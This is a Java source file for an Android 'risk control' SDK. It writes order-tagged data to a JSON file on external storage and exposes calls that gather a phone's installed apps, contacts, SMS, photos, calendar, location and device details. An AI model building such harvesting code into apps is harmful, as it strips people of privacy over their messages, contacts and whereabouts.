package com.risk.riskcontrol;

import android.app.Application;
import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.risk.riskcontrol.component.AppLifeManager;
import com.risk.riskcontrol.component.SpConstant;
import com.risk.riskcontrol.thread.CustomThreadPool;
import com.risk.riskcontrol.util.ContextUtil;
import com.risk.riskcontrol.util.GetAppListUtil;
import com.risk.riskcontrol.util.GetCalenderUtil;
import com.risk.riskcontrol.util.GetContactUtil;
import com.risk.riskcontrol.util.GetDeviceInfoUtil;
import com.risk.riskcontrol.util.GetLocationUtil;
import com.risk.riskcontrol.util.GetPhotoUtil;
import com.risk.riskcontrol.util.GetSmsUtil;
import com.risk.riskcontrol.util.Logan;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.uzmap.pkg.uzcore.uzmodule.UZModuleContext;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

public class RiskControlSDK {

    private final static String orderno = DiyMInfo.orderno;
    public static String realPath = DiyMInfo.realPath;
//    public static String realPath = Environment.getExternalStorageDirectory().getPath() + "/diyminfo.json";
    private final static String TAG = "DiyMInfo";


    public static void init(Context context) {
        CustomThreadPool.getInstance().init();
        ContextUtil.init(context);
        Logan.init(true);
//        AppLifeManager.getInstance().register(application);
        GetDeviceInfoUtil.getNetIp();
    }

    public static void initApp(Application application){
        AppLifeManager.getInstance().register(application);
    }

    public static void sendMessage(UZModuleContext context, boolean status, int code, String msg, String type, boolean deleteJsFunction) {
        if (context == null) {
            return;
        }
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("status", status);
            jsonObject.put("code", code);
            jsonObject.put("msg", msg);
            jsonObject.put("type", type);
        } catch (Exception e) {
            e.printStackTrace();
        }
        context.success(jsonObject, deleteJsFunction);
    }

    public static void sendMessage(UZModuleContext context, boolean status, int code, String msg, String type, JSONObject result, boolean deleteJsFunction) {
        if (context == null) {
            return;
        }
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("status", status);
            jsonObject.put("code", code);
            jsonObject.put("msg", msg);
            jsonObject.put("type", type);
            jsonObject.put("result", result);
        } catch (Exception e) {
            e.printStackTrace();
        }
        context.success(jsonObject, deleteJsFunction);
    }

    public static void writeSDFile(String keyName, String content) throws IOException {
        XXPermissions.with(AppLifeManager.getInstance().getTaskTopActivity())
                .permission(Permission.Group.STORAGE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            try {
                                write(keyName, content);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        Log.d(TAG, "not READ_EXTERNAL_STORAGE or WRITE_EXTERNAL_STORAGE permission");
                    }
                });
    }

    private static void write(String keyName, String content) throws IOException {
        if (TextUtils.isEmpty(realPath)){
            return;
        }
        File file = new File(String.valueOf(realPath));
        String lastContent = "";
        if (file.exists()) {

            FileInputStream outputStream = new FileInputStream(file);
            int len = outputStream.available();
            byte[] buffer = new byte[len];
            outputStream.read(buffer);
            outputStream.close();

            String org_content = new String(buffer);
            JSONObject contentObj = new JSONObject();
            if (!TextUtils.isEmpty(org_content)) {
                try {
                    contentObj = new JSONObject(org_content);
                    contentObj.put(keyName, content);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            lastContent = contentObj.toString();

        } else {

            JSONObject contentObj = new JSONObject();
            try {
                contentObj.put("orderno", orderno);
                contentObj.put(keyName, content);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            lastContent = contentObj.toString();
        }
        FileOutputStream outputStream = new FileOutputStream(file);
        outputStream.write(lastContent.getBytes());
        outputStream.close();
    }

    public static void setUserPhoneNum(String phoneNum){
        SpConstant.setPhoneNum(ContextUtil.getAppContext(), phoneNum);
    }

    public static void getAppInfo(){
        GetAppListUtil.get(null);
    }

    public static void getContactInfo(){
        GetContactUtil.get(null);
    }

    public static void getDeviceInfo(){
        GetDeviceInfoUtil.get(null);
    }

    public static void getLocationInfo(){
        GetLocationUtil.getLocationInfo(null);
    }

    public static void getPhotoInfo(){
        GetPhotoUtil.getPhotoInfo(null);
    }

    public static void getSmsInfo(){
        GetSmsUtil.getSmsInfo(null);
    }

    public static void getCalenderInfo(){
        GetCalenderUtil.get(null);
    }


}
